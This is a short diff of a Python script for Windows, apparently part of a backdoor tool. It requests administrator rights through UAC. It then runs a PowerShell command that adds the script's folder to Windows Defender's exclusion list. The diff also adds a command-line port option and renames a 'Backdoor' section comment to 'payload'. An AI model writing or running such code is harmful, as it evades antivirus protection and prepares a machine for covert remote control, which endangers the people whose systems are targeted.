@@ -1,7 +1,18 @@
 import os,socket,subprocess
 import time,sys
-
 import win32com.shell.shell as shell
+import argparse
+
+### argparser
+parser = argparse.ArgumentParser()
+parser.add_argument("--port","-p",dest="host_port",help="host's port number",type=int,)
+
+args = parser.parse_args()
+if(args.host_port==None):
+    print("no host port input error...")
+else:
+    #print(f"{args.host_port}")
+    pass
 
 ### UAC to get Admins
 print("UAC start...")
@@ -15,7 +26,7 @@ script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
 subprocess.call(script,shell=True) #다른프로세스로 실행되기때문에, vscode 또는 cmd 출력을 사용할 수 없습니다.
 #os.system("pause")
 
-# ### Backdoor
+#### payload
 
 
 
